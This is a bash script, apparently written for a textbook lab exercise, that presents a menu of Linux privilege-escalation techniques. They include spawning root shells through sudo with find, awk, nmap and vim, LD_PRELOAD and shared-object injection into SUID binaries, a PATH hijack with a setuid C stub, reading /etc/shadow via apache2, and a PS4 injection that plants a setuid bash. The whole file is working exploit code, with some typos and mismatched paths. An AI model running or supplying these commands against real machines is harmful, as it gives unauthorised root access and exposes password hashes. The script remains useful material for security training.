#!/bin/bash
banner() {

printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[1;31m           Privelege Esclation Script \e[0m        \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              coded for chpter 7   experiment             \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf "\n"
printf "        \e[1;91m for testing only\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"

}
#--------------------------------------------------below kernel exploit------------------------------


#----------------------------------------------above kernelexploit---------------------------------------
methodselect() {
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]Coded for chpter 7 experiment \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
echo -n "Select\n"
read -p 'Method; ' method ;
echo $method
}

start() {
if [[ $method -eq 1 ]];then
	print "using nano"
	sudo find /bin -name nano -exec /bin/sh \;
	print "Executed successfull run command id"

elif [[ $method -eq 2 ]];then
	sudo awk 'BEGIN {system("/bin/sh")}'

elif [[ $method -eq 3 ]] ;
then
	print "using nmap\n"
	echo "os.execute('/bin/sh')" > shel.nse && sudo nmap --script=shell.nse
elif [[ $method -eq 4 ]] ;
then
	print "Priv Esc using VIM"
	sudo vim -c '!sh'

elif [[ $method -eq 5 ]]  ;
then
	print "Shared Object Injection using EV, Must place so file in /tmp/name.so"
	#sudo LD_PRELOAD=/tmp/x.so apache2

elif [[ $method -eq 6 ]] ; then
	print "SO Injection SUID-bins"
	print "Making New directory"
	mkdir /home/kali/.config
	cp libcalc.c /home/.config
	print "compiling c"
	gcc -shared -o /home/kali/.config/libcalc.so -fPIC /home/kali/.config/libcalc.c
	print "Compiled, now time to inject so"
	/usr/local/bin/suid-so

elif [[ $method -eq 7 ]] ;
 then
	print "Abusing File Missconfig/permissions from SUDO SUID-bins"
	echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
	print "Compiling Obj file"
	gcc /tmp/service.c -o /tmp/service
	print "Exporting paths"
	export PATH=/tmp:$PATH
	/usr/local/bin/suid-env
	print "check if we got root"
	id
elif [[ $method -eq 8 ]] ;
then

	print "Extracting users using misconfigured permisisons,apache2 "
	sudo apache2 -f /etc/shadow
elif [[ $method -eq 9 ]] ;
then
	print "Try injecting o file using EV"
	gcc -fPIC -shared -o file.so ldpreload.c -nostartfiles
	sudo LD_PRELOAD=/home/kali/auto_exploiter/file.so apache2
elif [[ $method -eq 10 ]] ;
then
	print "SUID bins and EV"
	env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
elif [[ $method -eq 11 ]] ;
then
print "SUID Bin and ev method 2";
#function /usr/sbin/service\(\) { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; \}
#export -f /usr/sbin/service
#/usr/local/bin/suid-env2
else
echo 'non'
fi
}

banner
methodselect
start
